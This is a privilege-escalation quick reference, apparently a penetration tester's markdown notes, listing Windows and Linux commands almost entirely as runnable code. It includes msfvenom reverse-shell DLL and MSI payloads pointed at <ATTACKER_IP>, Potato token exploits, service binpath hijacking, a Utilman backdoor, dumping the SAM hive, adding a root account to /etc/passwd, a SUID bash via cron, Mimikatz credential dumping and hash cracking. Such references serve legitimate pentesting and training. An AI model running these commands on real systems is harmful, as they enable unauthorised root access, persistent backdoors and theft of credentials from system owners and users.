# Privilege Escalation Quick Reference

Fast-lookup command reference. For the full reasoning behind *why* each of
these matters and the order I check them in, see the methodology files:
[Linux PrivEsc](../methodology/linux-privesc.md) ·
[Windows PrivEsc](../methodology/windows-privesc.md).

## Windows

### Enumeration

```powershell
whoami /all ; whoami /priv ; whoami /groups
systeminfo ; wmic qfe get Caption,Description,HotFixID,InstalledOn
net user | Get-LocalUser ; net localgroup Administrators
Get-Process ; Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Automated first pass
.\winPEASx64.exe
. .\PowerUp.ps1 ; Invoke-AllChecks
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report <name> -Format TXT,HTML"
```

### Tokens — SeImpersonate / SeAssignPrimaryToken (Potato family)

```powershell
whoami /priv
PrintSpoofer.exe -i -c powershell.exe
GodPotato.exe -cmd "cmd /c whoami"
RoguePotato.exe -r <ATTACKER_IP> -e "shell.exe" -l 9999
JuicyPotatoNG.exe -t * -p "shell.exe" -a
```

### Services

```cmd
:: Binary hijack (SERVICE_CHANGE_CONFIG or writable exe)
icacls "C:\Path\to\service.exe"
sc qc <service>
sc config <service> binpath= "C:\path\shell.exe"
sc start <service>

:: Unquoted service path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: Weak registry permissions on a service key
accesschk.exe /accepteula -uvwqk <reg_path>
reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

### DLL hijacking / AlwaysInstallElevated / Autorun / Scheduled tasks

```powershell
# DLL hijack — find with Process Monitor, drop a malicious DLL of the missing name
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > payload.dll

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > reverse.msi
msiexec /quiet /qn /i reverse.msi

# Autorun keys (needs a writable target path)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Scheduled tasks
schtasks /query /fo LIST /v
icacls "<task_binary_path>"
```

### Credential hunting

```cmd
cmdkey /list
findstr /si password *.xml *.ini *.txt *.config
dir /s *pass* *cred* *vnc* *.config*
findstr /spin "password" *.*

:: PowerShell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

:: Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr "DefaultUserName DefaultPassword"

:: KeePass databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
keepass2john Database.kdbx > hash ; john --wordlist=rockyou.txt hash
```

### SeBackup / SeTakeOwnership

```cmd
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
:: download both, then: impacket-secretsdump -system SYSTEM -sam SAM LOCAL

takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
copy cmd.exe utilman.exe
```

### Pass the hash

```bash
pth-winexe -U <domain>/<user>%<lmhash>:<nthash> //<TARGET_IP> cmd.exe
```

## Linux

### Automated first pass

```bash
./linpeas.sh
./linux-exploit-suggester.sh
```

### SUID / SGID / capabilities

```bash
find / -perm -u=s -type f 2>/dev/null
find / -type f -perm -4000 -user root 2>/dev/null
getcap -r / 2>/dev/null                        # look for cap_setuid, etc.
# then check https://gtfobins.github.io for the exact binary
```

### sudo rights

```bash
sudo -l
# GTFOBins example: gcc -wrapper /bin/sh,-s .
```

### Cron / PATH abuse

```bash
cat /etc/crontab ; crontab -l
grep CRON /var/log/syslog
pspy64            # watch scheduled/root activity live without needing root

# If PATH starts with a writable dir, or a cron script calls a relative binary:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <writable-script-in-path>
/tmp/bash -p
```

### Writable /etc/passwd

```bash
openssl passwd -1 -salt x <PASSWORD>
echo 'hx:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd ; su hx
```

### NFS (no_root_squash) / disk group

```bash
cat /etc/exports        # target ; showmount -e <TARGET_IP> from attacker
# mount, then build a SUID root shell in the mounted dir

# disk group
debugfs /dev/sda1
debugfs: cat /etc/shadow
```

### Kernel exploits (last resort)

```bash
uname -r ; cat /etc/issue
searchsploit "linux kernel <distro> <version> Local Privilege Escalation"
```

## Credential dumping (post-privesc)

```bash
# Windows — Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
lsadump::sam ; lsadump::secrets

# Linux
cat /etc/shadow
```

## Cracking

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt          # NTLM
hashcat -m 1800 linux.hashes.txt /usr/share/wordlists/rockyou.txt    # sha512crypt
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
